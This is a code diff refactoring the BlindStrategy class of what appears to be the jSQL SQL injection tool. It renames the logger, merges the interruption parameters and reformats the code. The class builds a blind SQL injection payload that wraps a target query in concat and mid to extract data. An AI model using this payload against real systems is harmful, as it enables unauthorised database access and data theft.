@@ -3,10 +3,9 @@ package com.jsql.model.pattern.strategy;
 import com.jsql.exception.PreparationException;
 import com.jsql.exception.StoppableException;
 import com.jsql.model.InjectionModel;
+import com.jsql.model.Suspendable;
 import com.jsql.model.bean.Request;
 import com.jsql.model.blind.ConcreteBlindInjection;
-import com.jsql.model.interruptable.Interruptable;
-import com.jsql.model.interruptable.Stoppable;
 import com.jsql.view.GUIMediator;
 
 public class BlindStrategy implements IInjectionStrategy {
@@ -17,15 +16,15 @@ public class BlindStrategy implements IInjectionStrategy {
     
     @Override
     public void checkApplicability() throws PreparationException {
-        InjectionModel.logger.info("Blind test...");
+        InjectionModel.LOGGER.info("Blind test...");
         
         blind = new ConcreteBlindInjection();
         
         isApplicable = blind.isInjectable();
         
-        if(isApplicable){
+        if (isApplicable) {
             activate();
-        }else{
+        } else {
             deactivate();
         }
     }
@@ -50,23 +49,23 @@ public class BlindStrategy implements IInjectionStrategy {
     }
 
     @Override
-    public String inject(String sqlQuery, String startPosition, Interruptable interruptable, Stoppable stoppable) throws StoppableException {
+    public String inject(String sqlQuery, String startPosition, Suspendable stoppable) throws StoppableException {
         return blind.inject("(" +
                 "select+" +
                     "concat(" +
                         "0x53514c69," +
                         "mid(" +
-                            "("+sqlQuery+")," +
-                            startPosition+"," +
+                            "(" + sqlQuery + ")," +
+                            startPosition + "," +
                             "65536" +
                         ")" +
-                    ")"+
-                ")", interruptable, stoppable);
+                    ")" +
+                ")", stoppable);
     }
 
     @Override
     public void applyStrategy() {
-        InjectionModel.logger.info("Using blind injection...");
+        InjectionModel.LOGGER.info("Using blind injection...");
         GUIMediator.model().applyStrategy(this);
         
         Request request = new Request();
